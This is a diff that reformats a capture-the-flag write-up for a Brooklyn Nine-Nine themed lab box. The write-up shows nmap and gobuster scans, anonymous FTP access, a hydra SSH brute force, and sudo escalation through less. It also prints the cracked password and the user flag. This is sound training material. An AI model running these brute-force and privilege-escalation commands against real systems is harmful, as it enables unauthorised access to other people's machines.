@@ -6,7 +6,7 @@ pagination_prev: null
 
 ## Task 1: Deploy and get hacking
 ### User flag
-- First, let's scan the target using `nmap`.
+First, let's scan the target using `nmap`.
 ```
 $ nmap -sC -sV 10.10.255.141
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 21:01 IST
@@ -43,7 +43,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
 ```
-- There are three open ports:
+There are three open ports:
 
 | Port | Service | 
 |---|----|
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
 | 22 | ssh |
 | 80 | http |
 
-- Let's scan all the directories using `gobuster`.
+Let's scan all the directories using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.255.141 -w /usr/share/wordlists/dirb/common.txt 
 ===============================================================
@@ -78,8 +78,9 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================
 ```
-- There seems to be nothing of interest in the web directories.
-- Let's login anonymously through FTP.
+There seems to be nothing of interest in the web directories.
+
+Let's login anonymously through FTP.
 ```
 $ ftp anonymous@10.10.255.141
 Connected to 10.10.255.141.
@@ -91,7 +92,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-- Let's check out the contents of this directory.
+Let's check out the contents of this directory.
 ```
 ftp> ls
 200 EPRT command successful. Consider using EPSV.
@@ -99,7 +100,7 @@ ftp> ls
 -rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
 226 Directory send OK.
 ```
-- We can download the `note_to_jake.txt` file to our machine using the `get` command.
+We can download the `note_to_jake.txt` file to our machine using the `get` command.
 ```
 ftp> get note_to_jake.txt
 local: note_to_jake.txt remote: note_to_jake.txt
@@ -109,15 +110,16 @@ local: note_to_jake.txt remote: note_to_jake.txt
 226 Transfer complete.
 119 bytes received in 00:00 (0.85 KiB/s)
 ```
-- Let's check what is in the `note_to_jake.txt` file.
+Let's check what is in the `note_to_jake.txt` file.
 ```
 $ cat note_to_jake.txt 
 From Amy,
 
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 ```
-- The only service remaining is SSH. That means that the user `jake` has a weak SSH password.
-- Using `hydra`, we can brute force the password.
+The only service remaining is SSH. That means that the user `jake` has a weak SSH password.
+
+Using `hydra`, we can brute force the password.
 ```
 $ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.255.141 -t 4
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -130,8 +132,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-06 21:56:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-06 21:59:14
 ```
-- Now we know that for the user `jake`, the password is `987654321`.
-- Let's login through SSH using these credentials.
+Now we know that for the user `jake`, the password is `987654321`.
+
+Let's login through SSH using these credentials.
 ```
 $ ssh jake@10.10.255.141            
 The authenticity of host '10.10.255.141 (10.10.255.141)' can't be established.
@@ -143,7 +146,7 @@ jake@10.10.255.141's password:
 Last login: Tue May 26 08:56:58 2020
 jake@brookly_nine_nine:~$ 
 ```
-- Let's go to the user `holt`.
+Let's go to the user `holt`.
 ```
 jake@brookly_nine_nine:~$ cd ..
 jake@brookly_nine_nine:/home$ ls
@@ -152,7 +155,7 @@ jake@brookly_nine_nine:/home$ cd holt/
 jake@brookly_nine_nine:/home/holt$ ls
 nano.save  user.txt
 ```
-- We can now get the user flag.
+We can now get the user flag.
 ```
 jake@brookly_nine_nine:/home/holt$ cat user.txt 
 ee11cbb19052e40b07aac0ca060c23ee
@@ -165,7 +168,7 @@ ee11cbb19052e40b07aac0ca060c23ee
 &nbsp;
 
 ### Root flag
-- Let's check what file the `jake` user can execute.
+Let's check what file the `jake` user can execute.
 ```
 jake@brookly_nine_nine:/home/holt$ sudo -l
 Matching Defaults entries for jake on brookly_nine_nine:
@@ -174,16 +177,16 @@ Matching Defaults entries for jake on brookly_nine_nine:
 User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
 ```
-- We can got to GTFOBins to find an exploit for the `less` binary.
+We can got to GTFOBins to find an exploit for the `less` binary.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/1082bb6e-c589-4c23-9535-3b9ebbea349d)
 
-- Copy and paste the `Sudo` exploit in the terminal.
+Copy and paste the `Sudo` exploit in the terminal.
 ```
 jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
 # 
 ```
-- You will have to press `ENTER` once again after entering the command.
+You will have to press `ENTER` once again after entering the command.
 ```
 # cd root       
 # ls
